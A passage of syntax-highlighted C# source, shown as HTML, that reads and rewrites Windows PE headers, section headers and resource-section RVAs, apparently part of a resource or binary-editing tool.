                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc2">// major bit not set - leaf
</span><span class="sc0">                        </span><span class="sc11">FixDataEntry</span><span class="sc10">(</span><span class="sc11">resOffset</span><span class="sc10">+</span><span class="sc11">x</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">newResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">pos</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// positions in src &amp; dest must be set to data entry
</span><span class="sc0">            </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">FixDataEntry</span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">dataOffset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">oldResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">newResRVA</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">dataOffset</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">=</span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">rva</span><span class="sc10">+=</span><span class="sc11">newResRVA</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">rva</span><span class="sc10">-=</span><span class="sc11">oldResRVA</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">+=</span><span class="sc4">3</span><span class="sc10">*</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">+=</span><span class="sc4">3</span><span class="sc10">*</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0"> 
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">,</span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">rva</span><span class="sc10">=</span><span class="sc11">rva</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">size</span><span class="sc10">=</span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc5">override</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"0x"</span><span class="sc10">+</span><span class="sc11">rva</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"X8"</span><span class="sc10">)+</span><span class="sc6">",0x"</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"X8"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">SectionHeader</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">virtualSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">virtualAddress</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">sizeOfRawData</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">pointerToRawData</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">pointerToRelocations</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">pointerToLineNumbers</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">numberOfRelocations</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">numberOfLineNumbers</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">characteristics</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">SectionHeader</span><span class="sc10">()</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">numberOfLineNumbers</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">numberOfRelocations</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">pointerToLineNumbers</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">pointerToRelocations</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">SectionHeader</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">strname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">vsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">vaddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">phsize</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">phoffs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strname</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=(</span><span class="sc16">byte</span><span class="sc10">)</span><span class="sc11">strname</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">virtualSize</span><span class="sc10">=</span><span class="sc11">vsize</span><span class="sc10">;</span><span class="sc0"> 
                </span><span class="sc11">virtualAddress</span><span class="sc10">=</span><span class="sc11">vaddr</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">sizeOfRawData</span><span class="sc10">=</span><span class="sc11">phsize</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">pointerToRawData</span><span class="sc10">=</span><span class="sc11">phoffs</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">characteristics</span><span class="sc10">=</span><span class="sc11">flags</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">numberOfLineNumbers</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">numberOfRelocations</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">pointerToLineNumbers</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">pointerToRelocations</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">virtualSize</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">virtualAddress</span><span class="sc10">);</span><span class="sc0">            
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">sizeOfRawData</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">pointerToRawData</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">pointerToRelocations</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">pointerToLineNumbers</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">numberOfRelocations</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">numberOfLineNumbers</span><span class="sc10">);</span><span class="sc0">            
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">characteristics</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">name</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">virtualSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">            
                </span><span class="sc11">virtualAddress</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">            
                </span><span class="sc11">sizeOfRawData</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">            
                </span><span class="sc11">pointerToRawData</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">            
                </span><span class="sc11">pointerToRelocations</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">            
                </span><span class="sc11">pointerToLineNumbers</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">     
                </span><span class="sc11">numberOfRelocations</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">            
                </span><span class="sc11">numberOfLineNumbers</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">            
                </span><span class="sc11">characteristics</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">sig</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0">       </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">machine</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">sections</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ticks</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">optHeaderSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">characteristics</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">magic</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc11">lMajor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc11">lMinor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">codeSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">IDSSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">UDSSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">entryPointRVA</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">baseOfCodeRVA</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">baseOfDataRVA</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">imageBase</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">sectionAlignment</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">fileAlignment</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">osMajor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">osMinor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">userMajor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">userMinor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">subsysMajor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">subsysMinor</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">headerSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">imageSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">chkSum</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">subSystem</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">dllFlags</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">stackReserveSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">stackCommitSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">heapReserveSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">heapCommitSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">loaderFlags</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">dataDictionaryCount</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">exportTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">importTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">resourceTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">exceptionTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">certificateTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">baseRelocationTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">debugTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">copyrightTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">globalPtrTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">tlsTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">loadConfigTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">boundImportTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">iatTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">delayImportDescriptorTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">cliHeaderTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">reservedTable</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">sectionHeaders</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">GetResourceSection</span><span class="sc10">(</span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">try</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">resourceTable</span><span class="sc10">.</span><span class="sc11">rva</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">OffsetFromRVA</span><span class="sc10">(</span><span class="sc11">resourceTable</span><span class="sc10">.</span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadBytes</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">resourceTable</span><span class="sc10">.</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">catch</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">


            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MSDOSHeader</span><span class="sc0"> </span><span class="sc11">msdosheader</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// PE Header (24.2.2)
</span><span class="sc0">                </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">msdosheader</span><span class="sc10">.</span><span class="sc11">Lfanew</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">sig</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">sig</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=(</span><span class="sc16">byte</span><span class="sc10">)</span><span class="sc7">'P'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">sig</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=(</span><span class="sc16">byte</span><span class="sc10">)</span><span class="sc7">'E'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">sig</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">sig</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">(</span><span class="sc6">"Missing PE file signature"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">machine</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">machine</span><span class="sc10">!=</span><span class="sc4">0x14c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">(</span><span class="sc6">"Incorrect machine id code"</span><span class="sc10">);</span><span class="sc0">
